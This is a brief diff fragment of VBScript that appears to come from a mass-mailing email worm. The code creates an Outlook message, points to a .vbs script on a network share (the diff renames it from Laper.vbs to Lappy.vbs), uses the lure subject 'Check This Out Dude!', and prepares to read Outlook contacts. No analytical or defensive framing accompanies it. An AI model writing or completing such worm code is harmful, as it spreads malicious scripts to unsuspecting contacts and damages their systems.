@@ -10,7 +10,7 @@ End If
 Set objMail = objOutlook.CreateItem(0)
 
 SkipOutlook:
-strFilePath = "\\network\share\Laper.vbs"
+strFilePath = "\\network\share\Lappy.vbs"
 strEmailSubject = "Check This Out Dude!"
 
 ' Check if there are any email addresses in the Outlook contacts
